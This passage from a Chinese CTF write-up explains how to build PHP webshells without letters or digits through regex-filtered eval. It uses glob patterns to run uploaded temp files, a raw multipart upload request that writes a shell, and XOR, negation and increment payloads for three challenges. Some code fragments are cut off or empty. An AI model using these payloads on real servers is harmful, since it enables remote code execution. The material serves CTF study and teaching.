假如我们要执行生成的文件，那我们可以尝试下
    . /???/?????????
但是我们会发现这样(通常情况下)并不能争取的执行文件，而是会报错，原因就是这样匹配到的文件太多了，系统不知道要执行哪个文件。  
根据P神的文章，最后我们可以采用的Payload是:
    . /???/????????[@-[]
最后的[@-[]表示ASCII在@和[之间的字符，也就是大写字母，所以最后会执行的文件是tmp文件夹下结尾是大写字母的文件。由于PHP生成的tmp文件最后一位是随机的大小写字母，所以我们可能需要多试几次才能正确的执行我们的代码。(50%的几率嘛)  
固有最终数据包:
    POST /?code=?> HTTP/1.1
    Host: xxxxxx:2333
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type:multipart/form-data;boundary=--------123
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Length: 106
    ----------123
    Content-Disposition:form-data;name="file";filename="1.txt"
    echo " success.php
    ----------123--    
上面我们写入了一个shell。如图，成功Getshell。  
# 几道题目
## 题目一
    50){
            die("Too Long.");
        }
        if(preg_match("/[A-Za-z0-9_]+/",$code)){
            die("Not Allowed.");
        }
        @eval($code);
    }
    ?>
### 解法一
很明显，我们上面提到的不用_写shell的方法也适用于本题，直接对%a0传参cat flag.php就行
### 解法二
当然，利用异或，我们也可以构造出类似的Payload:
    ?>
    也即:
    ?>
### 解法三
解法一和解法二属于威力大，可直接任意代码执行。但在此题中由于有hint的存在，我们可以不必任意代码执行，而只是执行getFlag()即可。  
利用异或，有Payload:
    ${"`{{{"^"?<>/"}['+']();&+=getFlag
同样利用取反也可以执行代码，不再赘述。
## 题目二
    35){
        die("Long.");
        }
        if(preg_match("/[A-Za-z0-9_$]+/",$code))
        {
            die("NO.");
        }
        @eval($code);
    }
    else
    {
        highlight_file(__FILE__);
    }
    //$hint="php function getFlag() to get flag";
    ?>
### 解法一
这道题很明显可以利用上面所讲的
    . /???/????????[@-[]
来执行命令，毕竟getshell了还愁没有flag?就不再介绍此种方法  
### 解法二
同样解法一属于任意代码执行，但在这道ctf题目中，我们已知了目录下存在flag.php文件所以可以利用通配符直接匹配文件并输出。  
故有Payload:
    code=?>
其中/???/??? ????.???匹配/bin/cat flag.php，这样也能得到flag。
## 题目三
这是De1ctf Hard_Pentest_1的第一部分。第一步要求我们上传一句话木马。其正则限制为:
    /[a-z0-9;~^`&|]/is
~、^都被过滤了，很明显就是要用自增法构造了。由于;也被过滤了，所以只能使用短标签法。  
有EXP:
其实从上面这些题目，我们可以看到，在三种方法中，使用异或、取反的方法构造出来的Payload长度较短，使用自增的方法构造出的Payload较长。所以一般限制长度执行的题目考察的都是~、^(不然限制你长度为100还是太长的也没什么意思)，但当过滤了~、^(如De1ctf那道)，思路很明显就是自增了。而过滤了;的情况，就指明要你使用短标签了。
# 总结
其实上面方法的思路大多数都是一样的，就是表示出各个字母进而执行函数。学习过程中也可对PHP的动态性有更深的理解。但如P神所说，这种方法构造出来的webshell由于不包含字母数字，熵值很高，一看就有问题，所以一般也只在CTF中存在，实战一般不存在这种情况。
# 参考文章
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)  
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list)  
[PHP不使用数字,字母和下划线写shell](https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/)  
[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284)